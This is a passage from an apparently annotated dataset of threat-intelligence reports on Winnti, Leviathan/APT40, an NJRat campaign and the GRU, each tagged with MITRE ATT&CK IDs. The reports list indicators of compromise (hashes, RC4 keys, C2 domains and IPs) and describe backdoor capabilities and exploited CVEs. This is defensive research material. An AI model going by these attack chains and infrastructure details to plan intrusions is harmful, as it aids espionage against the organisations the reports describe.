day by day, the targets of the threat groups are more extended and specialized.\nApparently, the gaming sector would look like as a non-significant sector in the worldwide economy.\nHowever, as we could analyze there is an APT specialized within it.\nWe conclude that all the sectors are relevant in the current globalized economy and consequently would be a potential target for some APT.\nAnother relevant conclusion in this research, it is the strategy applied by Winnti Group to compromise as much organizations as they can.\nThe campaign aimed an important gaming supply chain organization to reach high rates of victims, as this organization distributed massively the infected product.\nWherefore, the national and international suppliers are an important target for many APT.\n**Indicators of Compromise**\n----------------------------\n**Samples of compromised files ([1]):**\n| SHA-1 | Compile Time (UTC) | RC4 Key | PayloadSH1 |\n| 7cf41b1acfb05064518a2ad9e4c16fde9185cd4b  | Tue Nov 13 10:12:58 2018  | 1729131071  | 8272c1f4  |\n| 7f73def251fcc34cbd6f5ac61822913479124a2a  | Wed Nov 14 03:50:18 2018  | 19317120    | 44260a1d  |\n| dac0bd8972f23c9b5f7f8f06c5d629eac7926269  | Tue Nov 27 03:05:16 2018  | 1729131071  | 8272c1f4  |\nPayload samples:\n| **SHA-1** | **C&C Server URL** |\n| a045939f53c5ad2c0f7368b082aa7b0bd7b116da   | https://bugcheck.xigncodeservice[.]com/Common/Lib/Common\\_bsod.php  |\n|  a260dcf193e747cee49ae83568eea6c04bf93cb3  | https://bugcheck.xigncodeservice[.]com/Common/Lib/Common\\_Include.php  |\n|  dde82093decde6371eb852a5e9a1aa4acf3b56ba  | https://bugcheck.xigncodeservice[.]com/Common/Lib/common.php  |\n|  8272c1f41f7c223316c0d78bd3bd5744e25c2e9f  | https://nw.infestexe[.]com/version/last.ph  |\n|  44260a1dfd92922a621124640015160e621f32d5  | https://dump.gxxservice[.]com/common/up/up\\_base.php  |\nDropper download by: api.goallbandungtravel[.]com.\n| **ID** | **Description** |\n| T1195  | Supply Chain Compromise |\n| T1050  | New Service |\n| T1022  | Data Encrypted |\n| T1079  | Multilayer Encryption |\n| T1032  | Standard Cryptographic Protocol (RC4, RC5) |\n| T1043  | Commonly Used Port (80,443) |\n| T1009  | Binary Padding |\n**Mitre ATT&TTP Matrix**\n------------------------\nIn the following table you can check the TTPs associated with this group following the ATT & CK Framework of MITRE:\n| **Domain**  | **ID** | **Name** | **Description** |\n| Enterprise  | T1195  | Supply Chain Compromise | Winnti Has Compromised software provider companies |\n| Enterprise  | T1085  | Rubdll32 | Winnti modifies Windows Dll files to persistance |\n| Enterprise  | T1050  | New Service | Winnti creates a new service that runs in background |\n| Enterprise  | T1060  | Registry Run Keys / Start folder | Winnti modify Windows Registry to check if should stop |\n| Enterprise  | T1102  | Web Service | Winnti contact C&C |\n| Enterprise  | T1140  | Deobfuscate / Decode Files or Information  | Winnti send information ofuscated |\n| Enterprise  | T1012  | Query Registry | Winnti modifies Windows dll files to persistence |\n| Enterprise  | T1024  | Custom Cryptographic | Winnti communicates the C&C with base64-encoded data |\n| Enterprise  | TT1001 | Data Obfuscation |  Winnti uses Cryptographic Protocol (RC4, RC5)  |\n| Enterprise  | T1219  | Remote Access Tools | Winnti installs backdoor that communicates with C&C to download executable code |\n**References:**\n---------------\n[1] L\u00e9veill\u00e9, M. E. (2019, 11 March).\nGaming industry still in the scope of attackers in Asia.\n<https://www.welivesecurity.com/2019/03/11/gaming-industry-scope-attackers-asia/>\n[2] Barnab\u00e1s, C. S. A. B. A. (2017).\nCHINA\u2019S RISE AND THE GEOPOLITICS OF SOUTHEAST ASIA. Distant Magazine.\n[3] BBVA. (2014).\nThe BBVA Research Geo World Report A Visual Guide to Geopolitical Affairs.\n<https://www.bbvaresearch.com/wp-content/uploads/2014/12/Geo-World-Report-2H-2014.pdf>\n[4] Newzoo.(2018).\nMobile Revenues Account for More Than 50% of the Global Games Market as It Reaches $137.9 Billion in 2018.\n<https://newzoo.com/insights/articles/global-games-market-reaches-137-9-billion-in-2018-mobile-games-take-half/>\n[5] Global Game Services.(2017, 1 January).\nAsia Game Markets | LAI Global Game Services.\nRetrieved from <https://www.lai.com/en/asia-game-markets>\n[6] Kaspersky Lab Global Research and Analysis Team.(2013).\nWinnti. Retrieved from <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134508/winnti-more-than-just-a-game-130410.pdf>\n[7]Fung, A. (2016).\nGlobal Game Industries and Cultural Policy (3rd edit.).Hong Kong.", "mitre_ids": ["G0044", "G0044", "G0044", "G0044", "G0044", "G0044", "G0044", "G0044", "TA0011", "T1195", "T1543", "T1560", "T1573", "T1573", "T1071", "T1027", "T1195", "T1543", "T1547", "T1102", "T1140", "T1012", "T1573", "T1573", "T1219"], "anno_name_label": [["TECHNIQUE", "Rundll32"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Leviathan: Geostrategy and TTP (Tactics, Techniques and Procedures)\nMay 30, 2019\n**Executive summary**:\n----------------------\nFireEye posted a relevant report regarding one of the most active threat groups; Leviathan, also known as TEMP, Periscope or TEMP. Jumper.\nThis APT is supposedly attributed to the Chinese government ([1]).\nIn this report is shown how involved the cyber threat groups are in the geostrategy of countries.\nChina is the main supplier of Europe in several products.\nApproximately since 2009, China has aimed to build up a maritime route known as OBOR (One Belt, One Road).\nThe main goal of this project is to develop a safe trading corridor to export Chinese products to all European countries in a fluid way with lower international tax.\nHowever, the geostrategic trouble begins in the South Chinese Sea as there are many bordering countries which are trying to control the area by carrying out military operations with their navy forces.\nThis fact poses a major threat for the effectiveness of the OBOR route.\nPresumably, to afford the conflict China has designed a strategic plan to quickly develop its navy to become one of the most important in the world.\nLeviathan has carried out several cyberattacks against the following countries: Cambodia, Belgium, Germany, Hong Kong, Phillipine Islands, Malaysia, Norway, Saudi Arabia, Switzerland and the United States.\nAll of these countries are involved in the OBOR route.\nThe fields of the organizations which have been cyber attacked by Leviathan belong to the logistic, engineering, naval technology and naval defense industry ([1]).\n**Geostratic analysis of the APT 40 campaign:**\n-----------------------------------------------\nCurrently, there are relevant military tensions at the beginning of the route.\nIn geostrategic terms, the Paracelso and Spratlkly Islands are key points for China and the surrounding countries to guarantee the normal vessel traffic inside the OBOR route ([11]).\nIf a country blocked the traffic of this area, the negative consequences for the Chinese and the world\u2019s economy would be considerably dangerous.\nA general map of the whole OBOR route and all the ports involved is shown below ([9]).\nAs can be seenin the graph above, currently the most desired route for the Chinese government is by crossing the South Sea through the Malacca Channel, Arabic Sea to the Suez Canal to end in the Port of Piraeus.\nThe main diplomatic conflicts in the OBOR route are among United States, Malaysia, Taiwan, Vietnam, Japan, Indonesia and the Philippine Islands ([12]).\nThe following map shows the specific areas that are diplomatically confronted with China and the rest of the countries mentioned before.\n![](https://lab52.es/blog/wp-content/uploads/2019/05/cao-2.jpg)\n*Illustration 1: OBOR Route*\n![](https://lab52.es/blog/wp-content/uploads/2019/05/cao-3-1.jpg)\n*Illustration 2: International waters claimed by countries.*\nIn this APT 40 or Leviathan campaign, the countries that received cyberattacks were USA, Malaysia, Cambodia, Brunei, Philippine Islands and Hong Kong.\nThe relation among the States involved in this geostrategic conflict in the Chinese Sea and the organizations that have been targeted by APT 40 is highly strong.\nMoreover, it is important to mention that Saudi Arabia, Germany, Norway and UK has been targeted by Leviathan ([1]).\n![](https://lab52.es/blog/wp-content/uploads/2019/05/cao-414.png)\n*Illustration 3: SouthEast countries targeted by Leviathan*\nAPT 40 has designed and carried out this campaign with the main goal of collecting classified information from navy and defense organizations.\nWith this classified information, China, supposedly expects to develop its navy infrastructure to reach its aim of becoming a significant military power with high competencies in \u201cblue waters\u201d or oceanic waters ([13]).\nThe following graph shows the evolution of the Chinese naval military development.\nAs it is shown, in the last 20 years the Chinese Army has exponentially developed their military tools and navy resources ([10]).\nChina is trying to be efficient and competitive in military terms as the United States.\n![](https://lab52.es/blog/wp-content/uploads/2019/05/cao-5-2-1024x538.png)\n*Illustration 4: Comparison between the US military resources and the Chinese military resources.*\nFireEye considers that presumably, Leviathan is an APT associated to the Chinese government and its main task and duties are focused on carrying out cyber-attacks to collect classified information.\nAmong some of the evidence collected to conclude the attribution of this campaign was the Chinese time zone (UTC+8), as the majority of the operations were executed in this gap of time.\nWhois\u201d data has also been collected from the domains suggesting that the infrastructure is located in China.\nFuthermore, some APT 40 IP have been identified and localized in China as 112.66.188[.]28 which is associated with a Chinese VPN.\nAs can be seen in the following graph, this address is connected to a Chinese server from Telecom located in Haian.\nAlthough the geolocation of that kind of service and the location of an IP is not a determinant element to get an attribution, in this case there is another fact that reinforces the theory that China carried out the cyberattacks.\nIt is important to mention that the Command and Control that was intercepted by FireEye was configured in Chinese.\n![](https://lab52.es/blog/wp-content/uploads/2019/05/8682AAB1-416D-4FB6-B739-89D65CE1008B.jpg)\n*Illustration 5: An\u00e1lisis con maltego de la IP 112.66.160.20*\nLIFE CYCLE\nIn the following part, there is a brief description about each stage followed by this threat group ([1]).\nFirst part of the cyberattack:\nSeveral techniques used in this phase have been identified.\nHowever, there are some techniques that have been used in the majority of this campaign\u2019s cases.\n* Web Shells: In organizations that were previously compromised, usually the threat actors leavesleft the servers infected, just in case they want to exfiltrate more information in the future, as they still guarantee access to the system.\n* Spear Phishing: The threat group uses phishing emails to targeted organizations.\nIn these campaigns they made use of links to Google drive to download the malware in their spear phishing emails with malicious attachments.\nIn their campaigns they mostly exploited the following vulnerabilities:\n*\no\u00a0\u00a0\u00a0 CVE-2012-0158 [2]\no\u00a0\u00a0\u00a0 CVE-2017-0199 [3]\no\u00a0\u00a0\u00a0 CVE-2017-8759 [5]\no\u00a0\u00a0\u00a0 CVE-2017-11882 [6]\nProcess to compromise\nWhen the threat actor has been able to access the systems they would try to get alternative points\u00a0 of access to the organization by expanding new backdoors or collecting user credentials.\nSpecifically, the new backdoors used in the organization ([8]):\nChina Chopper: Web Shell that is able to execute code on compromised computers.\nThis way, attackers can send commands via HTTP POST to infect servers.\nThe web Shell is able to: list directories, access databases and in general any action allowed by .NET.\nPhoto (also called: \u201cdersubi\u201d): A DLL that is the backdoor, this one has the following capabilities:\n\u25aa Listing directories, files and storage.\n\u25aa Opening of reverse shells.\n\u25aa Taking screenshots, video and audio recording.\n\u25aa Processing creation\n\u25aa Modifying registry keys.\n\u25aa Keylogging\n\u25aa Modifying files.\nBadflick: Backdoor with the ability to modify the file system, open reverse shells and modify the configuration of the C2.\nAirbreak (also called \u201cOrz\u201d): Malware which was programmed in JavaScript, with the capability to receive commands to execute from legitimate pages ([7]).\nBeacon: It is a malware distributed by the Cobalt Strike platform.\nThis malware is able to inject and execute codes and exfiltrate files.\nThe group usually collects corporate VPN credentials, as well as other remote administration services (see: SSH, RDP, etc.\nEscalation of privileges:\nAs in the previous stage, the group uses different tools and techniques to carry out \u00a0the privilege escalation.\nIn this stage, the group mainly focuses on collecting credentials from both open and private sources, passwords and hashes.\nWe could expect the use of tools like HOMEFRY, a tool based on Badflick and Airbreak with the ability to obtain and crack passwords.\nAs well as the use of native legitimate tools such as Windows Credential Editor or ProcDump.\nInternal recognition:\nLeviathan collects passwords to access other computers in the network.\nMoreover, the attackers take advantage of the native services of the system that would be activated by (RDP, SSH, etc.).\nSpecifically, some of the TTPs associated with this stage would be:\n\u2022 MURKYSHELL: malware capable of scanning ports and network enumerations.\n\u2022 Use of native Windows tools such as net.exe\n\u2022 Use of web shells in the internal network, as internal servers usually are less secure than external servers.\nLateral movement:\nThis stage is based on the information gathered in the previous stages.\nLeviathan is accustomed to using its own scripts, web shells and accessible services of the computers in the network.\nFor each compromised computer, the group usually executes a malware and performs new procedures of information recognition and theft tasks.\nUse of native tools such as at.exe (Task Scheduler) and net.exe (network resource management tool)\nMURKYTOP: Command line tool for equipment recognition ([8]).\nDISHCLOTH: Brute force tool to attack different services.\nPersistence:\nLeviathan uses backdoors and web shells to maintain persistence.\n* Some of the tools used in the previous phases also serve this purpose.\nUse of Web Shells as China Chopper.\n\u2022 Use of detection evasion techniques generating innocuous traffic.\n\u2022 Use of TCP ports 80 and 443.\nExfiltration :\nThe threat group uses compressing tools to encrypt the information before exfiltrating it.\nMoreover, the group develops its own tools to properly carry out y this stage.\nThe following graph, provides the different tools used by the group throughout its life cycle.\n![](https://lab52.es/blog/wp-content/uploads/2019/05/cao-77.png)\nIllustration 6: Malware used by Leviathan in each phase.\nFireEye   MITRE ATT&CK TTP Matrix:\n========================\nThe table below shows the TTP and Framework ATT&CK of MITRE ([4]):\n| **Domain** | **ID** | **Name** | **Description** |\n| Enterprise | T1078 | Valid Accounts | The group uses valid accounts to access to VPN, SSH and RDP services.|\n| Enterprise | T1192 | SpearPhishing Link | Leviathan uses Google Drive links in their Spear-phishing campaigns.|\n| Enterprise | T1193 | SpearPhishing Attachment | Leviathan spear-phishing emails typically leverage malicious attachments.|\n| Enterprise  | T1189 | Drive by Compromise | Leviathan usually compromises strategic websites and the group also relies on multiple web shells.|\n| Enterprise  | T1059 | Command-Line Interface | Leviathan uses different command line tools, like net.exe or MURKYTOP. |\n| Enterprise  | T1064 | Scripting | Leviathan uses custom scripts for internal reconnaissance and lateral movement.|\n| Enterprise  | T1053 | Scheduled Task  | Leviathan uses at.exe for lateral movement |\n| Enterprise  | T1100 |  Web Shell  | Leviathan relies on web shells such as China chopper.|\n| Enterprise  | T1110 | Brute Force  | Leviathan uses custom brute force tools as DISHCLOTH. |\n| Enterprise  | T1003 |  Credential Dumping  | Leviathan uses a mix of credential harvesting tools and password dumpers like Windows Credential Editor or their malware HOMEFRY. |\n| Enterprise  | T1081 | Credential in Files | Leviathan uses a mix of credential harvesting tools and password dumpers like Windows Credential Editor or their malware HOMEFRY. |\n| Enterprise  | T1046 | Network Service Scanning | Leviathan uses MURKYSHELL and net.exe for network service scanning.|\n| Enterprise  | T1210 | Explotation of Remote Service | Leviathan usually compromises internal servers with known vulnerabilities.|\n| Enterprise  | T1076 | Remote Desktop Protocol | Leviathan leverages RDP for lateral movement.|\n| Enterprise  | T1021 | Remote Service | Leviathan leverages RDP and SSH to facilitate internal reconnaissance.|\n| Enterprise  | T1002 | Data Compressed | Leviathan uses rar.exe to compress and encrypt files.|\n| Enterprise  | T1022 | Data Encrypted | Leviathan uses rar.exe to compress and encrypt files.|\n| Enterprise  | T1043 | Commonly Used Port | Leviathan uses mainly the TCP ports 80 and 443 for communications with their C2.|\n**Conclusions**:\n----------------\nThe government of China is presumably using APT 40 to collect classified information from the governments that are involved in the OBOR route against the Chinese international policies.\nAs we can see the defense industry is an important target for APT 40 as China aimed to grow and develop its defense resources to become one of the most important maritime army of the world.\nAll the suppliers related with the defense industry should be aware that they would be an important target for APT 40 as well.\nThe threat group would cyberattack the defense suppliers with the purpose of compromising the final defense organization.\nCurrently, for China and the rest of the countries with economies completely focused on exportations, it is highly important to keep the OBOR route under control of non-incidents as 80% of international trading is carried out by vessels.\n**References**:\n---------------\n[1] <https://www.fireeye.com/blog/threat-research/2019/03/apt40-examining-a-china-nexus-espionage-actor.html>\n[2] <http://cve.circl.lu/cve/CVE-2012-0158>\n[3] http://cve.circl.lu/cve/CVE-2017-0199\n[4] <https://attack.mitre.org/matrices/enterprise/>\n[5] <http://cve.circl.lu/cve/CVE-2017-8759>\n[6] <http://cve.circl.lu/cve/CVE-2017-11882>\n[7] Same TTP example, carried out by another group <https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/>\n[8] <https://www.fireeye.com/blog/threat-research/2018/03/suspected-chinese-espionage-group-targeting-maritime-and-engineering-industries.html>\n[9] EOM. (s.f.).\nRough waters in the China Sea.\n(Spanish) <https://elordenmundial.com/aguas-revueltas-en-el-mar-de-la-china-meridional/>\n[10][https://assets.bwbx.io/images/users/iqjWHBFdfxIU/iqLEpwHQiQe0/v0/1200\u00d7630.png](https://assets.bwbx.io/images/users/iqjWHBFdfxIU/iqLEpwHQiQe0/v0/1200x630.png)\n[11] Izquierdo, J. C. (s.f.).\nChina\u2019s global strategy to defend its interests.\n(Spanish) <http://www.ieee.es/Galerias/fichero/docs_opinion/2019/DIEEEO04_2019JAVCAR-China.pdf>\n[12]\u00a0 Parra P\u00e9rez, A. (s.f.).\nThe geopolitical game of the new Silk Road in Asia.\n(Spanish) <http://www.ieee.es/Galerias/fichero/docs_opinion/2018/DIEEEO126_2018AGUPAR-RutaSeda.pdf>\n[13] Paino, L. (s.f.).\nGeopolitics in the Pacific Indian Ocean.\n(Spanish) <http://www.ieee.es/Galerias/fichero/docs_opinion/2018/DIEEEO59-2018_Indo-Pacifico_NvaChina_LauraPaino.pdf>", "mitre_ids": ["G0065", "G0065", "G0065", "G0065", "G0065", "G0065", "G0065", "G0065", "G0065", "G0065", "G0065", "G0065", "G0065", "G0065", "G0065", "G0065", "G0065", "TA0011", "T1505", "T1098", "T1041", "T1566", "T1566", "T1566", "T1566", "T1203", "T1203", "T1203", "T1203", "TA0006", "TA0003", "TA0003", "S0020", "T1505", "T1059", "T1071", "T1059", "T1083", "T1005", "T1083", "T1005", "T1059", "T1113", "T1125", "T1123", "T1543", "T1112", "T1056", "T1565", "TA0011", "S0229", "S0229", "T1071", "T1071", "S0154", "S0154", "T1055", "T1041", "TA0006", "TA0004", "TA0006", "S0229", "TA0006", "G0065", "TA0006", "TA0008", "T1046", "S0039", "T1059", "TA0008", "G0065", "T1059", "TA0007", "T1053", "S0039", "S0233", "T1110", "G0065", "T1059", "TA0003", "T1505", "T1071", "TA0010", "G0065", "T1078", "T1566", "T1566", "T1189", "T1059", "T1059", "T1053", "T1505", "T1110", "T1552", "T1046", "T1210", "T1021", "T1021", "T1560", "T1560", "T1071", "G0065", "G0065", "G0065"], "anno_name_label": [["TOOL", "ProcDump"], ["MALWARE", "MURKYSHELL"], ["TOOL", "DISHCLOTH"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Ongoing Njrat campaign against Middle East\nSeptember 26, 2019\nDuring the last months, Lab52 has been monitoring an infection campaign that is using different kinds of threats.\nOne of these threats is Vengeance Justice Worm, also known as Vjw0rm, which is developed in Javascript.\nThis is a type of malware capable of acting as a RAT or spreading through removable devices, thus doing worm functions, among others.\n[1] Its second main threat is Hallaj Pro RAT, a modified version of the well-known NJRat Trojan, which consists of a remote control tool known since 2013, and developed in .NET, and which has been seen on multiple occasions related to campaigns carried out against the Middle East.\nThe starting point of our investigation is the appearance of the command and control domain \u201clalik.linkpc[.]net\u201d in two samples found that corresponded to a Vjw0rm and a modified NJRat.\nThrough the information collected from our sources of information, a large number of IP addresses linked to this domain have been observed.\nBy investigating the public information of the IP address **91.109.190[.]4** to which the domain is currently resolving, the following information was extracted:\n| **Domain resolved** | **First resolution** | **Last resolution** |\n| **lalik.linkpc.net** | **2018-04-10 12:14:42** | **2019-09-11 13:56:08** |\n| **lamorem.ddns.net** | **2019-05-05 10:56:28** | **2019-09-07 11:41:55** |\n| **rafikehachi.ddns.net** | **2019-06-27 00:00:00** | **2019-06-27 00:00:00** |\n| **shams9.ddns.net** | **2019-05-28 06:17:05** | **2019-06-02 09:01:50** |\n| **microsoft-ipv6.duckdns.org**  | **2019-01-01 08:52:12** | **2019-05-28 07:51:23** |\n| **googlyoutuob.ddns.net** | **2019-05-17 00:00:00** | **2019-05-17 00:00:00** |\n| **zdexx.hopto.org** | **2019-05-11 00:00:00** | **2019-05-11 00:00:00** |\n| **mantruck95.ddns.net** | **2019-03-30 00:00:00** | **2019-05-10 18:04:02** |\nThe table above shows a subset of the most recent domains associated with IP **91.109.190[.]4**, which attract attention because they all are dynamic domains.\nIn addition, some of them with names clearly used to try to deceive victims and go unnoticed as \u201cmicrosoft-ipv6.duckdns[.]org\u201d or \u201cgooglyoutuob.ddns[.]net\u201d.\nThis fact especially catches our attention, so we decided to review these domains and the relationship with the IP addresses with which they have had a relationship in recent months.\nDuring the investigation, the IP address **91.109.190[.]4** is used as a link.\nThis analysis reveals some noteworthy elements:\n![](https://lab52.io/blog/wp-content/uploads/2019/09/image1-1-1024x779.png)\nIn the graph above, a remarkable relationship can be identified among all these domains, malware samples and IP addresses.\nUndoubtedly, the infrastructure used has great similarities for each of the identified clusters.\nAfter analyzing several of the related malware samples, it has been observed that most of them are different versions of NJRat.\nA pattern can also be observed in the geographical distribution of the IP addresses to which each of the domains has resolved in recent months Can be seen how for each domain, there is a set of addresses located in the same country in the Middle East.\nIn addition, all these sets of addresses in each country share several IPs in France that act as a link between the different domains.\nAfter analyzing them, it was observed that most of them belong to the service provider \u201cIELO-LIAZO DEPLOIEMENT FIBRE\u201d.\n**ANALYSIS** **OF SAMPLES**\nSome interesting information has been obtained from the analysis of the samples of modified NJRat that were related to the domains and IP addresses previously investigated.\nSeveral layers of packaging and obfuscation were identified in most of the samples analyzed.\nThe capabilities presented by the analyzed samples are wide, allowing to act as a keylogger, execute native commands, take screenshots or use the camera, among many other options.\nThe string \u201ctekide\u201d and \u201cHallaj Pro RAT [Fixed]\u201d were found in the process memory of many of the samples.\nA quick search of the string \u201ctekide\u201d on the internet, shows in different sources, information about the user \u201cMr. Tekide\u201d relating this Nick with a malware author who is credited with ties to the Iranian government, and who has repeatedly been linked to the use of NJRat. [2][3]\nThe 2016 report in which CitizenLabs [2] identified the appearance of this same username in several PDBs of the analyzed samples.\nOn that occasion, the samples were dedicated to well-known opponents of the Iranian regime.\nOn this occasion we identified the following PDBs:\nC:\\Users\\**fouad**\\Desktop\\1.pdb\n(2f79d0e4225a89c91687f126e0a83d0d4e6089fceb4507fff35da92fe8f69eb9)\nC:\\Users\\**fouad**\\AppData\\Local\\Temporary\nProjects\\Windows\\obj\\x86\\Release\\Windows.pdb\n(f874d130689ddb025f13a52ebd70b06a949c7968d4ce16d9480a0328e2819b70)\nThe first one is in a packed .NET executable, which, after its execution, deciphers more logic of the threat, which contains the second string.\nIn this second phase, a resource embedded in the executable itself is decrypted and loaded directly into memory, consisting of the final payload, NJRat.\n**Technical analysis**\nAs mentioned above, this are some examples of the several layers of obfuscation and encryption that many samples have, to make it difficult for the analyst to analyze them.\n![](https://lab52.io/blog/wp-content/uploads/2019/09/image3-1-1024x336.png)\n![](https://lab52.io/blog/wp-content/uploads/2019/09/image4-1.png)\n![](https://lab52.io/blog/wp-content/uploads/2019/09/image2-1.png)\nIn addition, NJRat\u2019s capabilities are extensive and well known.\nMost samples contain two types, one called \u201ckl\u201d, which acts as a keylogger, and another called \u201cOK\u201d, which contains the other functionalities such as RAT capabilities.\nIn the following fragment, can be seen the code of the function used by the \u201cACT\u201d command which appears only in some samples to exfiltrate the title of the window on which the user is working.\n![](https://lab52.io/blog/wp-content/uploads/2019/09/image5-1.png)\nOne of the most relevant methods in the OK type is **Ind ()**.\nThis function contains all the logic of the RAT in terms of interaction with the operators.\nAll supported commands, and therefore their capabilities, are interpreted here and then the necessary logic is called in each case.\nThe code of this method is very extensive, but in the following image, there is a fragment of the code related to the RAT logic oriented to the download and execute of extra binarys on the victim\u2019s machine, thus acting as a \u201cDropper\u201d of new threats or tools.\n![](https://lab52.io/blog/wp-content/uploads/2019/09/image6-1.png)\nA notable feature of this threat is the ability to mark the process as critical.\nA process marked as critical forces the machine to restart if it is finished [4].\nIt is understood that this would be a method used to force a restart in situations that operators consider appropriate.\nThe **pr(int)** method implements calls to the Microsoft NtSetInformationProcess API to mark the critical process flag.\nThis method is called with an integer as an argument, the values it admits are 0 and 1, indicating noncritical or critical, respectively.\n![](https://lab52.io/blog/wp-content/uploads/2019/09/image7-1.png)\n![](https://lab52.io/blog/wp-content/uploads/2019/09/image8.png)\nBoth the analysis of the infrastructure, as well as the different capabilities of the threat and its packaging, show a knowledge drawn from the reuse of the same TTPs for a long time.\nIn addition have been observed that some of the functionalities of the commands seem to have varied among them.\nTherefore it can be said that this campaign has been active for a long time, and that it is in constant evolution.\n**Links**\n[1]<https://cofense.com/vjw0rm-malware-heres-watch/>\n[2]<https://citizenlab.ca/2016/08/group5-syria/>\n[3]<https://cybershafarat.com/2019/06/11/mr-tekide/>\n[3]<https://devblogs.microsoft.com/oldnewthing/20180216-00/?p=98035>\n[4]<https://www.fortinet.com/blog/threat-research/bladabindi-remains-a-constant-threat-by-using-dynamic-dns-services.html>", "mitre_ids": ["T1059", "T1091", "TA0011", "T1056", "TA0002", "T1113", "T1125", "T1140", "T1055", "T1027", "T1056", "T1005", "T1105"], "anno_name_label": [["MALWARE", "njrat"], ["MALWARE", "Vjw0rm"], ["MALWARE", "HallajPro"], ["MALWARE", "njrat"], ["TECHNIQUE", "HallajPro"], ["MALWARE", "Vjw0rm"], ["MALWARE", "njrat"], ["MALWARE", "njrat"], ["MALWARE", "njrat"], ["MALWARE", "njrat"], ["MALWARE", "njrat"], ["MALWARE", "njrat"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CI"]}, {"cti_report": "(Cyber) GRU (XIV): conclusions\nOctober 18, 2019\nIn this work, we have analyzed mainly the structure, targets and TTP of the GRU in the cyber field, based on the information brought to light during 2018 and which allowed to obtain a detailed knowledge of the Service and its activities, not only to intelligence services, but also to poor analysts like us who do not have all the capabilities that a state can have.\nWith what we know, even analyzing public sources, we have access to information that in some cases should be considered sensitive and that, without a doubt, is being -or has been- analyzed by services from all over the world, starting with Russia itself.\nThe fact that we know the GRU better than a year ago does not mean that now it is a worse service than before; it will remain part of the elite, fulfilling its missions and acting \u201c*in any part of the world where it is required*\u201c, said one of its former directors.\nThe GRU, or APT28, or whatever you want to name it, will continue to be a very important player in the cyber field and, of course, in the non-cyber realm.\nWe all make mistakes, and the GRU made them on that occasion \u2013 and they were published.\nHowever, it is more of a concern in certain circles that the GRU failed in its operations than to have leaked the identities or modus operandi of some of its members.\nCurrently, we are aware of the cyber activity of two Service Units that work in a coordinated manner to benefit the interests of the Russian Federation ; one of them, Unit 26165 which is responsible for the technical operations of the GRU (CNE and CNA), while the other one is Unit 74455, which is responsible for the psychological operations (PSYOP) of the Service.\nTheir joint work reflects the Russian conception of information warfare, different from the Western conception, which is the handling of stolen information to favor Russian interests and which is identified with two fields of action: the confrontation of technical information and the confrontation of psychological information.\nAPT28 is linked to the GRU, if it is not the name given to the cyber division of the Service.\nIt has possibly been operational since 1953, the year that Military Unit 26165 was founded.\nSo instead of \u2018fancy bear\u2019 we should call it \u2018old bear\u2019 (and change the logo to that of the attached image) and perhaps not only steals information for the benefit of the Russian government, but uses it intelligently in psychological operations.\nAnd it not only has NEC capabilities, like any other intelligence service in the world, but also NAC capabilities, since we must remember that it is a military service and will therefore carry out pure attack operations, not just information theft.\n![](https://www.securityartwork.es/wp-content/uploads/2019/05/bear.jpg) APT28.\nSource: Old Bear Press\nWe hope this work will help a little bit to get to know the GRU better, which we talked about briefly when we discussed the issue of the Russian cyber-intelligence community and which lately, for all that has happened, deserved a series of its own.\nNow, we have to wait for new public information that allows us to also analyze the cyber division of the FSB. Until a few months ago, the FSB was better known than the GRU but surely it has aspects that we cannot even imagine\u2026", "mitre_ids": ["G0007", "G0007", "G0007", "G0007", "G0007", "G0007", "G0007", "G0007", "G0007", "G0007", "G0007", "G0007", "G0007", "G0035", "G0035", "G0007"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "(Cyber) III Cold War: Hack the vote?\nOctober 18, 2019\nAs you now, the DHS (Department of Homeland Security) along with the ODNI (Office of the Director of National Intelligence)\u00a0[formally accused](https://www.odni.gov/index.php/newsroom/press-releases/215-press-releases-2016/1423-joint-dhs-odni-election-security-statement)\u00a0Russia of meddling in the past US presidential elections with techniques from the burning information warfare and various cyberattacks.\nLet\u2019s take a (somewhat delayed) look at this.\n![This image has an empty alt attribute; its file name is imagen1post.png]\n(https://www.securityartwork.es/wp-content/uploads/2016/10/imagen1post.png)\nIt is not the first time that USA launches accusations of this caliber, it did so when it accused China of stealing trade secrets in 2014.\nAn accusation of this kind could involve, officially or unofficially, attacks on Russian IT infrastructures that posed a headache for Putin and his allies.\n[According to statements in the NYT](http://www.nytimes.com/2016/10/09/us/politics/what-options-does-the-us-have-after-accusing-russia-of-hacks.html?_r=1)\u00a0 taking this type of action would involve too much risk with elections less than a month away; cyberattacks by a power like Russia against the US electronic voting system could wreak havoc.\nIt should also be noted that the electoral system is still not considered a critical infrastructure of the nation, although it may increase their criticality shortly.\nAs we told you in the first issue of this saga\u00a0[(in spanish)](https://www.securityartwork.es/2015/10/20/cyber-guerra-fria-i-ataque-a-tv5monde/), Russia, like other States, has (always supposedly) conducted PSYOP (Psychological Operations) to misinform, to create confusion or discord for the sake of their own benefit, and that includes operations in cyberspace.\nHistorically, Russia is an expert in the use of information for personal gain (just study propaganda operations of Spetsnaz).\nEvents, among others, like the parliamentary elections in Ukraine in 2007, the 